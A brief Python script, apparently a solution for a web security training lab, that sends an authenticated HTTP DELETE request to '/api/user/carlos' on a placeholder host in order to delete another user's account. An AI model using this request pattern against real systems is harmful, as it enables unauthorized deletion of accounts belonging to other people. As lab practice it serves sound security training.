import requests
import re

host='YOUR_HOST'
path='/api/user/carlos'

headers = {
    'Cookie': 'session=YOUR_SESSION',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br'
}

res=requests.delete("https://"+host+path, headers=headers)
print(res.status_code)
print(res.text)


